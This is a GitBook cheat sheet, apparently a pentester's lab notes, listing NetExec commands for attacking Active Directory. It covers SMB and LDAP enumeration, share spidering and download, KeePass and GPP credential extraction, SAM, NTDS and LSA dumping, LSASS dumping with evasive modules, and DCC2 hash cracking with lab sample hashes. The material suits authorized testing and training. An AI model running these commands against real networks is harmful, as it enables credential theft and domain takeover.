---
cover: ../../../.gitbook/assets/nxc_logo.avif
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NetExec (/CME)

[NetExec](https://www.netexec.wiki/#netexec) (nxc) is a **network service exploitation tool** that helps automate assessing the security of large networks. An amazing tool that makes enumerating and exploiting **Active Directory (AD) environments** exponentially more efficient! You can view its usage in almost any of the [AD-related boxes](../../../boxes/boxes/#active-directory).

## SMB

### Enumeration

{% tabs %}
{% tab title="Shares" %}
{% code overflow="wrap" %}
```bash
nxc smb <TARGET-IP> --shares
# NULL session
nxc smb <TARGET-IP> -p '' -u '' --shares
# guest session
nxc smb <TARGET-IP> -p 'guest' -u '' --shares
# anonymous session
nxc smb <TARGET-IP> -p 'anonymous' -u '' --shares
```
{% endcode %}
{% endtab %}

{% tab title="Users" %}
{% code overflow="wrap" %}
```bash
# domain users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users
# local users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users --local-auth
# domain computer users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers
# local computer users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers --local-auth
# rids (default up to 4000)
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid>
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' > dom_users
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
{% code overflow="wrap" %}
```bash
# domain groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --groups --local-groups 
# local groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --local-groups 
```
{% endcode %}
{% endtab %}

{% tab title="Sessions" %}
```bash
# active sessions
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --sessions
# logged on users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --loggedon-users
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Password Policy" %}
```bash
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --pass-pol
```
{% endtab %}
{% endtabs %}

### Spidering

```bash
# search for txt files
nxc smb <ip> -u <user> -p <pass> --spider <share> --pattern txt
# file content
nxc smb <ip> -u <user> -p <pass> --spider <share> --content --regex Encrypt
# recursive
nxc smb <ip> -u <user> -p <pass> --spider <share> --regex . --depth 1
```

### Upload/Download

Donwload/upload file. If large files are failing/erroring, add  `--smb-timeout` with a value than 2.

```bash
# donwload file(s)
nxc smb <ip> -u <user> -p <pass> --spider <share>  --get-file <file1> <file2>
# upload file(s)
nxc smb <ip> -u <user> -p <pass> --spider <share>  --put-file <file1> <file2>
```

Donwload a share.

{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=SMB/
```
{% endcode %}

### Modules

#### User Information

The `whoami` module returns more information that just the `whoami` command.

```bash
nxc smb <ip> -u <user> -p <pass> -M whoami -o USER=<user>
```

#### NIC Enumeration

```bash
# via WMI
nxc smb <ip> -u <user> -p <pass> -M get_netconnections
# via RPC
nxc smb <ip> -u <user> -p <pass> -M ioxidresolver
```

#### KeePass Credentials

After running it check `/tmp/export.xml`.

{% code overflow="wrap" %}
```bash
# locate the keepass configuration file
nxc smb <ip> -u <user> -p <pass> -M keepass_discover
# check for creds
nxc smb <ip> -u <user> -p <pass> -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 
```
{% endcode %}

#### GPP

Retrieve the plaintext password for accounts pushed through GPPs.

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_password
```

Search for `registry.xml` files for autologin information.

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_autologin
```

#### RDP Enablement

```bash
nxc smb <ip> -u <user> -p <pass> -M rdp -o ACTION=enable
```

{% hint style="info" %}
For **stealing hashes via writeable shares** via SMB using `slinky`, `drop-sc`, or `scuffy` check [here](../../../services/services/smb-139-445.md#hashes).
{% endhint %}

### Credentials

{% tabs %}
{% tab title="SAM" %}
```bash
nxc smb <ip> -u <user> -p <pass> --sam
```
{% endtab %}

{% tab title="NTDS" %}
```bash
nxc smb <ip> -u <user> -p <pass> --ntds --user <user>
```
{% endtab %}

{% tab title="LSA" %}
```bash
nxc smb <ip> -u <user> -p <pass> --lsa
```
{% endtab %}
{% endtabs %}

The hash format that starts with `$DCC2$` (derived from `--lsa`), which stands for _Domain Cached Credentials 2_, is **stronger than NTLM** and **cannot be used for a PtH attack**. For attempting to crack them, the domain and username needs to be removed; only the value starting with `$DCC2$` is required.

```bash
# converting DCC2 hashes to hashcat format
cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
# cracking DCC2 hashes
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt 
<SNIP>
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1
<SNIP>
```

{% tabs %}
{% tab title="LSASS" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M lsassy
```
{% endtab %}

{% tab title="PROCDUMP" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M procdump
```
{% endtab %}

{% tab title="HANDLEKATZ" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M handlekatz
```
{% endtab %}

{% tab title="NANODUMP" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M nanodump
```
{% endtab %}
{% endtabs %}

<table><thead><tr><th width="156" align="right">Module</th><th>Description</th></tr></thead><tbody><tr><td align="right"><code>lsassy</code></td><td>Python-based, it uses Impacket to read the LSASS dump and <code>pypykatz</code> to extract credentials.</td></tr><tr><td align="right"><code>procdump</code></td><td>Uses the Sysinternals Procdump to create the LSASS dump and <code>pypykatz</code> to extract credentials.</td></tr><tr><td align="right"><code>handlekatz</code></td><td>Uses clone handles to create an obfuscated dump.</td></tr><tr><td align="right"><code>nanodump</code></td><td>Opening a handle to LSASS can be detected, so it searches for existing handles, and if one is found, it copies it and creates a LSASS minidump.</td></tr></tbody></table>

## LDAP

### Modules

#### DNS Zone-Transfer

```bash
nxc ldap <ip> -u <user> -p <pass> -M get-network -o ALL=true
```

#### LAPS

```bash
nxc ldap <ip> -u <user> -p <pass> -M laps
```

#### DACL Enumeration.

{% code overflow="wrap" %}
```bash
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET=<user> ACTION=read
# DCSync rights
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
{% endcode %}

## SSH

Key authentication.

```bash
nxc ssh <ip> -u root -p '' --key-file root_id_rsa
```

## Resources

{% tabs %}
{% tab title="Repo" %}
{% embed url="https://github.com/Pennyw0rth/NetExec" %}
{% endtab %}

{% tab title="Wiki" %}
{% embed url="https://www.netexec.wiki/" %}
{% endtab %}

{% tab title="Modules" %}
{% embed url="https://www.infosecmatter.com/crackmapexec-module-library/" %}
{% endtab %}

{% tab title="Demonstration" %}
{% embed url="https://www.youtube.com/watch?v=3SQMZzb4CnM" %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="HTB CME" %}
{% embed url="https://academy.hackthebox.com/course/preview/using-crackmapexec" %}
{% endtab %}

{% tab title="LAB" %}
{% embed url="https://www.nameyourpricetraining.com/courses/b6ce7e4c-5748-4272-b776-c400481791f6" %}
{% endtab %}
{% endtabs %}
